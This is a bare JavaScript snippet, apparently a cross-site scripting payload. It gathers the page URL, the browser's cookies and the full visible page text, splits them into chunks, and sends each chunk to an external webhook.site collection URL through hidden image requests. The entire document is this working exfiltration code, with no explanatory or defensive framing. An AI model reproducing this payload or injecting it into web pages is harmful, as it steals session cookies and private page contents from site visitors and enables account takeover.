let d = location.href + "\nCOOKIE=" + document.cookie + "\nBODY=" + document.body.innerText;
for (let i = 0; i < d.length; i += 1200) {
  new Image().src = 'https://webhook.site/aafa8677-2f48-451c-8e94-8fc04e13e176?i=' + i + '&d=' + encodeURIComponent(d.slice(i, i + 1200));
}
